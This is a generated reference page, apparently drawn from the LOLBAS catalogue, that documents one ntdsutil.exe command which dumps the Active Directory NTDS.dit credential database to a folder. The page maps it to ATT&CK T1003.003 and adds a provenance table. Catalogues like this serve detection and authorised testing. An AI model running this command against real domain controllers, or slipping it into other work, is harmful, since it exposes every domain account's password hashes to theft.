---
parsed_by: focuslocust
source: commands
type: generated
---
# ntdsutil Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ntdsutil.exe

Tool page: [ntdsutil.exe](../../tools/windows/ntdsutil.exe.md)

### Dumping of Active Directory NTDS.dit database

```text
ntdsutil.exe "ac i ntds" "ifm" "create full c:\" q q
```

Description:

Dump NTDS.dit into folder

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Ntdsutil.yml` |
| Evidence | Command preserved from source parser. |
